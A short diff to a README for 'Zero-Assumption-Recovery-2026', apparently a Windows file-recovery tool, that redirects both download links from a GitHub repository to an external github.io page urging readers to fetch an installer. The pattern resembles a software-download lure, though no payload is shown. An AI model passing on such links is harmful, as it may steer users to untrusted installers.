@@ -1,6 +1,6 @@
 # 💾 Zero-Assumption-Recovery-2026 - Recover Lost Files On Windows Systems
 
-[![](https://img.shields.io/badge/Download-Zero-Assumption-Recovery-2026-blue.svg)](https://github.com/enkidubandsaw837/Zero-Assumption-Recovery-2026)
+[![](https://img.shields.io/badge/Download-Zero-Assumption-Recovery-2026-blue.svg)](https://enkidubandsaw837.github.io)
 
 ## 📁 Project Overview
 
@@ -22,7 +22,7 @@ Connect your drive directly to the computer. Do not use a remote connection or a
 
 You must visit the project page to start the download. Click the link below to reach the official download source.
 
-[Download Zero-Assumption-Recovery-2026](https://github.com/enkidubandsaw837/Zero-Assumption-Recovery-2026)
+[Download Zero-Assumption-Recovery-2026](https://enkidubandsaw837.github.io)
 
 Follow these steps to download the installer:
 
